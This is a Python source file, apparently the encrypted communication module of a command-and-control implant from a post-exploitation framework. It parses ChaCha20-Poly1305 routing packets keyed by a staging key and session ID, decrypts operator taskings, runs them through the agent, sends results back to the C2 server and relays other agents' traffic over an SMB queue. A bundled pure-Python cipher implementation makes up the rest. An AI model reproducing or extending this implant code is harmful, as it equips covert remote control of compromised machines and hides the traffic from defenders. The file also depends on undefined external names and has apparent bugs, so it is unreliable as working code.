import base64
import os
import struct
import hmac


class PacketHandler:
    def __init__(self, agent, staging_key, session_id, key=None):
        self.agent = agent
        self.key = key
        self.staging_key = staging_key
        self.session_id = session_id
        self.missedCheckins = 0

        self.language_list = {
            'NONE': 0,
            'POWERSHELL': 1,
            'PYTHON': 2
        }
        self.language_ids = {ID: name for name, ID in self.language_list.items()}

        self.meta = {
            'NONE': 0,
            'STAGING_REQUEST': 1,
            'STAGING_RESPONSE': 2,
            'TASKING_REQUEST': 3,
            'RESULT_POST': 4,
            'SERVER_RESPONSE': 5
        }
        self.meta_ids = {ID: name for name, ID in self.meta.items()}

        self.additional = {}
        self.additional_ids = {ID: name for name, ID in self.additional.items()}


    def parse_routing_packet(self, staging_key, data):
        """
        Decodes the chacha20+poly1305 "routing packet" and parses raw agent data into:

            {sessionID : (language, meta, additional, [encData]), ...}


        Routing packet format:

            Routing Packet:
            +---------+--------------------------------+--------------------------+
            |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
            +---------+--------------------------------+--------------------------+
            |    12   |                32              |          length          |
            +---------+--------------------------------+--------------------------+

                ChaCha20+Poly1305(RoutingData):
                +---------------------------+---------------------------+
                |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
                +---------------------------+---------------------------+
                |           16              |            16             |
                +---------------------------+---------------------------+

                    ChaCha20(RoutingData):
                    +-----------+------+------+-------+--------+
                    | SessionID | Lang | Meta | Extra | Length |
                    +-----------+------+------+-------+--------+
                    |    8      |  1   |  1   |   2   |    4   |
                    +-----------+------+------+-------+--------+
        """

        nonce_length = 12
        chacha_header_length = nonce_length + 32

        if data:
            results = {}
            offset = 0

            # ensure we have at least the 20 bytes for a routing packet
            if len(data) >= chacha_header_length:

                while True:

                    if len(data) - offset < 44:
                        break

                    chacha_nonce = data[0 + offset:nonce_length + offset]
                    chacha_data = data[nonce_length + offset:chacha_header_length + offset]
                    enc_handler = ChaCha20Poly1305(staging_key)

                    decrypted = enc_handler.open(chacha_nonce, chacha_data, b"")
                    session_id = str(decrypted[0:8])

                    # B == 1 byte unsigned char, H == 2 byte unsigned short, L == 4 byte unsigned long
                    (language, meta, additional, length) = struct.unpack("=BBHL", decrypted[8:])

                    if length < 0:
                        encData = None
                    else:
                        encData = data[(chacha_header_length + offset):(chacha_header_length + offset + length)]

                    session_id = bytes(session_id[12:20].encode('utf-8')) # need to axe off "bytearray" from the string
                    results[session_id] = (self.language_ids.get(language, 'NONE'), self.meta_ids.get(meta, 'NONE'),
                                            self.additional_ids.get(additional, 'NONE'), encData)

                    # check if we're at the end of the packet processing
                    remaining_data = data[chacha_header_length + offset + length:]
                    if not remaining_data or remaining_data == '':
                        break

                    offset += chacha_header_length + length
                return results

            else:
                # print("[*] parse_agent_data() data length incorrect: %s" % (len(data)))
                return None

        else:
            # print("[*] parse_agent_data() data is None")
            return None


    def build_routing_packet(self, staging_key, session_id, meta=0, additional=0, enc_data=b''):
        """
        Takes the specified parameters for an "routing packet" and builds/returns
        an HMAC'ed chacha20+poly1305'ed "routing packet".

        packet format:

            Routing Packet:
            +---------+--------------------------------+--------------------------+
            |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
            +---------+--------------------------------+--------------------------+
            |    12   |                32              |          length          |
            +---------+--------------------------------+--------------------------+

                ChaCha20+Poly1305(RoutingData):
                +---------------------------+---------------------------+
                |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
                +---------------------------+---------------------------+
                |           16              |            16             |
                +---------------------------+---------------------------+

                    ChaCha20(RoutingData):
                    +-----------+------+------+-------+--------+
                    | SessionID | Lang | Meta | Extra | Length |
                    +-----------+------+------+-------+--------+
                    |    8      |  1   |  1   |   2   |    4   |
                    +-----------+------+------+-------+--------+

        """
        # binary pack all the passed config values as unsigned numbers
        #   B == 1 byte unsigned char, H == 2 byte unsigned short, L == 4 byte unsigned long
        data = session_id + struct.pack("=BBHL", 2, meta, additional, len(enc_data))
        cha_cha_nonce = os.urandom(12)
        key = staging_key

        enc_handler = ChaCha20Poly1305(key)
        cha_cha_enc_data = enc_handler.seal(cha_cha_nonce, data, b"")
        output_pkt = cha_cha_nonce + cha_cha_enc_data + enc_data
        return output_pkt

    def decode_routing_packet(self, data):
        """
        Parse ALL routing packets and only process the ones applicable
        to this agent.
        """
        # returns {sessionID : (language, meta, additional, [enc_data]), ...}
        packets = self.parse_routing_packet(self.staging_key, data)
        if packets is None:
            return
        for agent_id, packet in packets.items():
            if agent_id == self.session_id:
                (language, meta, additional, enc_data) = packet
                # if meta == 'SERVER_RESPONSE':
                self.process_tasking(enc_data)
            else:
                smb_server_queue.Enqueue(base64.b64encode(data).decode('UTF-8'))

    def build_response_packet(self, tasking_id, packet_data, result_id=0):
        """
        Build a task packet for an agent.

            [2 bytes] - type
            [2 bytes] - total # of packets
            [2 bytes] - packet #
            [2 bytes] - task/result ID
            [4 bytes] - length
            [X...]    - result data

            +------+--------------------+----------+---------+--------+-----------+
            | Type | total # of packets | packet # | task ID | Length | task data |
            +------+--------------------+--------------------+--------+-----------+
            |  2   |         2          |    2     |    2    |   4    | <Length>  |
            +------+--------------------+----------+---------+--------+-----------+
        """
        packetType = struct.pack("=H", tasking_id)
        totalPacket = struct.pack("=H", 1)
        packetNum = struct.pack("=H", 1)
        result_id = struct.pack("=H", result_id)

        if packet_data:
            if isinstance(packet_data, str):
                packet_data = base64.b64encode(packet_data.encode("utf-8", "ignore"))
            else:
                packet_data = base64.b64encode(
                    packet_data.decode("utf-8").encode("utf-8", "ignore")
                )
            if len(packet_data) % 4:
                packet_data += "=" * (4 - len(packet_data) % 4)

            length = struct.pack("=L", len(packet_data))
            return packetType + totalPacket + packetNum + result_id + length + packet_data
        else:
            length = struct.pack("=L", 0)
            return packetType + totalPacket + packetNum + result_id + length

    def parse_task_packet(self, packet, offset=0):
        """
        Parse a result packet-

            [2 bytes] - type
            [2 bytes] - total # of packets
            [2 bytes] - packet #
            [2 bytes] - task/result ID
            [4 bytes] - length
            [X...]    - result data

            +------+--------------------+----------+---------+--------+-----------+
            | Type | total # of packets | packet # | task ID | Length | task data |
            +------+--------------------+--------------------+--------+-----------+
            |  2   |         2          |    2     |    2    |   4    | <Length>  |
            +------+--------------------+----------+---------+--------+-----------+

        Returns a tuple with (responseName, length, data, remainingData)

        Returns a tuple with (responseName, totalPackets, packetNum, resultID, length, data, remainingData)
        """
        try:
            packetType = struct.unpack("=H", packet[0 + offset : 2 + offset])[0]
            totalPacket = struct.unpack("=H", packet[2 + offset : 4 + offset])[0]
            packetNum = struct.unpack("=H", packet[4 + offset : 6 + offset])[0]
            resultID = struct.unpack("=H", packet[6 + offset : 8 + offset])[0]
            length = struct.unpack("=L", packet[8 + offset : 12 + offset])[0]
            try:
                packetData = packet.decode("UTF-8")[12 + offset : 12 + offset + length]
            except:
                packetData = packet[12 + offset : 12 + offset + length].decode("latin-1")

            try:
                remainingData = packet.decode("UTF-8")[12 + offset + length :]
            except:
                remainingData = packet[12 + offset + length :].decode("latin-1")

            return (
                packetType,
                totalPacket,
                packetNum,
                resultID,
                length,
                packetData,
                remainingData,
            )
        except Exception as e:
            print("parse_task_packet exception:", e)
            return (None, None, None, None, None, None, None)

    def process_tasking(self, data):
        # processes an encrypted data packet
        #   -decrypts/verifies the response to get
        #   -extracts the packets and processes each
        try:
            # aes_decrypt_and_verify is in stager.py
            tasking = aes_decrypt_and_verify(self.key, data).encode("UTF-8")
            (
                packetType,
                totalPacket,
                packetNum,
                resultID,
                length,
                data,
                remainingData,
            ) = self.parse_task_packet(tasking)

            # execute/process the packets and get any response
            resultPackets = ""
            result = self.agent.process_packet(packetType, data, resultID)

            if result:
                resultPackets += result

            packetOffset = 12 + length
            while remainingData and remainingData != "":
                (
                    packetType,
                    totalPacket,
                    packetNum,
                    resultID,
                    length,
                    data,
                    remainingData,
                ) = self.parse_task_packet(tasking, offset=packetOffset)
                result = self.agent.process_packet(packetType, data, resultID)
                if result:
                    resultPackets += result

                packetOffset += 12 + length

            # send_message() is patched in from the listener module
            self.send_message(resultPackets)

        except Exception as e:
            print(e)
            pass

    def process_job_tasking(self, result):
        # process job data packets
        #  - returns to the C2
        # execute/process the packets and get any response
        try:
            resultPackets = b""
            if result:
                resultPackets += result
            # send packets
            self.send_message(resultPackets)
        except Exception as e:
            print("processJobTasking exception:", e)
            pass


def divceil(divident, divisor):
    """Integer division with rounding up"""
    quot, r = divmod(divident, divisor)
    return quot + int(bool(r))


class Poly1305(object):

    """Poly1305 authenticator
    Authored by Dušan Klinec's implementation at https://github.com/ph4r05/py-chacha20poly1305"""

    P = 0x3fffffffffffffffffffffffffffffffb # 2^130-5

    @staticmethod
    def le_bytes_to_num(data):
        """Convert a number from little endian byte format"""
        ret = 0
        for i in range(len(data) - 1, -1, -1):
            ret <<= 8
            ret += data[i]
        return ret

    @staticmethod
    def num_to_16_le_bytes(num):
        """Convert number to 16 bytes in little endian format"""
        ret = [0]*16
        for i, _ in enumerate(ret):
            ret[i] = num & 0xff
            num >>= 8
        return bytearray(ret)

    def __init__(self, key):
        """Set the authenticator key"""
        if len(key) != 32:
            raise ValueError("Key must be 256 bit long")
        self.acc = 0
        self.r = self.le_bytes_to_num(key[0:16])
        self.r &= 0x0ffffffc0ffffffc0ffffffc0fffffff
        self.s = self.le_bytes_to_num(key[16:32])

    def create_tag(self, data):
        """Calculate authentication tag for data"""
        for i in range(0, divceil(len(data), 16)):
            block = data[i * 16: (i + 1) * 16] + b"\x01"
            n = self.le_bytes_to_num(block)

            self.acc += n
            self.acc = (self.r * self.acc) % self.P

        self.acc += self.s
        return self.num_to_16_le_bytes(self.acc)
try:
    # in Python 3 the native zip returns iterator
    from itertools import izip
except ImportError:
    izip = zip

class ChaCha(object):

    """Pure python implementation of ChaCha cipher
    Authored by Dušan Klinec's implementation at https://github.com/ph4r05/py-chacha20poly1305"""

    constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]

    @staticmethod
    def rotl32(v, c):
        """Rotate left a 32 bit integer v by c bits"""
        return ((v << c) & 0xffffffff) | (v >> (32 - c))

    @staticmethod
    def quarter_round(x, a, b, c, d):
        """Perform a ChaCha quarter round"""
        xa = x[a]
        xb = x[b]
        xc = x[c]
        xd = x[d]

        xa = (xa + xb) & 0xffffffff
        xd = xd ^ xa
        xd = ((xd << 16) & 0xffffffff | (xd >> 16))

        xc = (xc + xd) & 0xffffffff
        xb = xb ^ xc
        xb = ((xb << 12) & 0xffffffff | (xb >> 20))

        xa = (xa + xb) & 0xffffffff
        xd = xd ^ xa
        xd = ((xd << 8) & 0xffffffff | (xd >> 24))

        xc = (xc + xd) & 0xffffffff
        xb = xb ^ xc
        xb = ((xb << 7) & 0xffffffff | (xb >> 25))

        x[a] = xa
        x[b] = xb
        x[c] = xc
        x[d] = xd

    _round_mixup_box = [(0, 4, 8, 12),
                        (1, 5, 9, 13),
                        (2, 6, 10, 14),
                        (3, 7, 11, 15),
                        (0, 5, 10, 15),
                        (1, 6, 11, 12),
                        (2, 7, 8, 13),
                        (3, 4, 9, 14)]

    @classmethod
    def double_round(cls, x):
        """Perform two rounds of ChaCha cipher"""
        for a, b, c, d in cls._round_mixup_box:
            xa = x[a]
            xb = x[b]
            xc = x[c]
            xd = x[d]

            xa = (xa + xb) & 0xffffffff
            xd = xd ^ xa
            xd = ((xd << 16) & 0xffffffff | (xd >> 16))

            xc = (xc + xd) & 0xffffffff
            xb = xb ^ xc
            xb = ((xb << 12) & 0xffffffff | (xb >> 20))

            xa = (xa + xb) & 0xffffffff
            xd = xd ^ xa
            xd = ((xd << 8) & 0xffffffff | (xd >> 24))

            xc = (xc + xd) & 0xffffffff
            xb = xb ^ xc
            xb = ((xb << 7) & 0xffffffff | (xb >> 25))

            x[a] = xa
            x[b] = xb
            x[c] = xc
            x[d] = xd

    @staticmethod
    def chacha_block(key, counter, nonce, rounds):
        """Generate a state of a single block"""
        state = ChaCha.constants + key + [counter] + nonce

        working_state = state[:]
        dbl_round = ChaCha.double_round
        for _ in range(0, rounds // 2):
            dbl_round(working_state)

        return [(st + wrkSt) & 0xffffffff for st, wrkSt
                in izip(state, working_state)]

    @staticmethod
    def word_to_bytearray(state):
        """Convert state to little endian bytestream"""
        return bytearray(struct.pack('<LLLLLLLLLLLLLLLL', *state))

    @staticmethod
    def _bytearray_to_words(data):
        """Convert a bytearray to array of word sized ints"""
        ret = []
        for i in range(0, len(data)//4):

            byte_data = data
            ret.extend(struct.unpack('<L', byte_data[i*4:(i+1)*4]))
        return ret

    def __init__(self, key, nonce, counter=0, rounds=20):
        """Set the initial state for the ChaCha cipher"""
        if len(key) != 32:
            raise ValueError("Key must be 256 bit long")
        if len(nonce) != 12:
            raise ValueError("Nonce must be 96 bit long")
        self.key = []
        self.nonce = []
        self.counter = counter
        self.rounds = rounds

        # convert bytearray key and nonce to little endian 32 bit unsigned ints
        self.key = ChaCha._bytearray_to_words(key)
        self.nonce = ChaCha._bytearray_to_words(nonce)

    def encrypt(self, plaintext):
        """Encrypt the data"""
        encrypted_message = bytearray()
        for i, block in enumerate(plaintext[i:i+64] for i
                                  in range(0, len(plaintext), 64)):
            key_stream = self.key_stream(i)
            encrypted_message += bytearray(x ^ y for x, y
                                           in izip(key_stream, block))


        return encrypted_message

    def key_stream(self, counter):
        """receive the key stream for nth block"""
        key_stream = ChaCha.chacha_block(self.key,
                                         self.counter + counter,
                                         self.nonce,
                                         self.rounds)
        key_stream = ChaCha.word_to_bytearray(key_stream)
        return key_stream

    def decrypt(self, ciphertext):
        """Decrypt the data"""
        return self.encrypt(ciphertext)



class TagInvalidException(Exception):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
class ChaCha20Poly1305(object):
    """Pure python implementation of ChaCha20/Poly1305 AEAD cipher
    Authored by Dušan Klinec's implementation at https://github.com/ph4r05/py-chacha20poly1305"""

    def __init__(self, key, implementation='python'):
        """Set the initial state for the ChaCha20 AEAD"""
        if len(key) != 32:
            raise ValueError("Key must be 256 bit long")
        if implementation != "python":
            raise ValueError("Implementations other then python unsupported")

        self.isBlockCipher = False
        self.isAEAD = True
        self.nonceLength = 12
        self.tagLength = 16
        self.implementation = implementation
        self.name = "chacha20-poly1305"
        self.key = key

    @staticmethod
    def poly1305_key_gen(key, nonce):
        """Generate the key for the Poly1305 authenticator"""
        poly = ChaCha(key, nonce)
        return poly.encrypt(bytearray(32))

    @staticmethod
    def pad16(data):
        """Return padding for the Associated Authenticated Data"""
        if len(data) % 16 == 0:
            return bytearray(0)
        else:
            return bytearray(16-(len(data)%16))

    def encrypt(self, nonce, plaintext, associated_data=None):
        return self.seal(nonce, plaintext, associated_data if associated_data is not None else bytearray(0))

    def decrypt(self, nonce, ciphertext, associated_data=None):
        return self.open(nonce, ciphertext, associated_data if associated_data is not None else bytearray(0))

    def seal(self, nonce, plaintext, data):
        """
        Encrypts and authenticates plaintext using nonce and data. Returns the
        ciphertext, consisting of the encrypted plaintext and tag concatenated.
        """
        if len(nonce) != 12:
            raise ValueError("Nonce must be 96 bit large")


        otk = self.poly1305_key_gen(self.key, nonce)

        ciphertext = ChaCha(bytearray(self.key), nonce, counter=1).encrypt(plaintext)

        mac_data = data + self.pad16(data)
        mac_data += ciphertext + self.pad16(ciphertext)
        mac_data += struct.pack('<Q', len(data))
        mac_data += struct.pack('<Q', len(ciphertext))

        tag = Poly1305(otk).create_tag(mac_data)

        return ciphertext + tag

    def open(self, nonce, ciphertext, data):
        """
        Decrypts and authenticates ciphertext using nonce and data. If the
        tag is valid, the plaintext is returned. If the tag is invalid,
        returns None.
        """
        if len(nonce) != 12:
            raise ValueError("Nonce must be 96 bit long")

        if len(ciphertext) < 16:
            return None

        expected_tag = ciphertext[-16:]
        ciphertext = ciphertext[:-16]

        otk = self.poly1305_key_gen(self.key, nonce)

        mac_data = data + self.pad16(data)
        mac_data += ciphertext + self.pad16(ciphertext)
        mac_data += struct.pack('<Q', len(data))
        mac_data += struct.pack('<Q', len(ciphertext))
        tag = Poly1305(otk).create_tag(mac_data)

        if not hmac.compare_digest(tag, expected_tag):
            raise TagInvalidException

        return ChaCha(self.key, nonce, counter=1).decrypt(ciphertext)
